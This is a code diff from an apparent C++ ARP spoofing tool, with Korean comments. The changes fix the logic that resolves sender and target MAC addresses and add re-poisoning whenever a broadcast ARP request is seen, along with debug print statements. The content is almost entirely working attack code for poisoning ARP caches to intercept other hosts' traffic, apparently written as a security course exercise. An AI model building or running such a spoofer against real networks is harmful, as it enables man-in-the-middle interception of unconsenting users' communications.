@@ -84,6 +84,7 @@ Mac send_arp_normal(Ip targetIp){
 
 //send arp-spoof packet
 void send_arp_spoof(Mac senderMac, Ip senderIp, Ip targetIp){
+	printf("sent to.. %s", static_cast<string>(senderMac).c_str());
 	EthArpPacket packet;
 	packet.eth_.smac_ = attackerMac;
 	packet.eth_.dmac_ = senderMac;
@@ -143,14 +144,14 @@ int main(int argc, char* argv[]) {
 	for (int i = 2; i < argc; i += 2) {
 		Ip senderIp = Ip(argv[i]);      // Sender IP
 		//ARPEntry에 있는 IP인지 확인
-		if(Network.find(senderIp)!=Network.end()){
+		if(Network.find(senderIp)==Network.end()){
 			Mac senderMac = send_arp_normal(senderIp);
 			Network.insert(make_pair(senderIp, senderMac));
 		}
 
 		Ip targetIp = Ip(argv[i + 1]); // Target IP
 		//ARPEntry에 있는 IP인지 확인
-		if(Network.find(targetIp)!=Network.end()){
+		if(Network.find(targetIp)==Network.end()){
 			Mac targetMac = send_arp_normal(targetIp);
 			Network.insert(make_pair(targetIp, targetMac));
 		}
@@ -158,6 +159,7 @@ int main(int argc, char* argv[]) {
 		ARPEntry.insert(make_pair(senderIp, targetIp));
 
 		send_arp_spoof(Network[senderIp], senderIp, targetIp);
+		printf("sent arp spoof\n");
 	}
 
 	while(true){
@@ -194,6 +196,9 @@ int main(int argc, char* argv[]) {
 
 			if(Network.find(senderIp)==Network.end() && Network.find(targetIp)==Network.end()) continue;
 
+			if(arp_hdr->tmac().isBroadcast()){
+				send_arp_spoof(Network[senderIp], senderIp,targetIp);
+			}
 			// sip가 센더로 저장되어있고 tip가 센더에 해당되는 ip가 아니라면 continue
 			// sip가 제대로 통신할 수 있도록 ARP 리퀘스트는 해야함
 			if(Network.find(senderIp)!=Network.end() && ARPEntry[senderIp]!=targetIp) continue;
@@ -202,6 +207,7 @@ int main(int argc, char* argv[]) {
 			// 타겟의 ARP 받으면 무조건 ARP 날리기	
 
 			send_arp_spoof(Network[senderIp], senderIp,targetIp);
+			printf("sent arp spoof2\n");
 		}
 
 		//ARP가 아닌데 sip가 센더Ip면
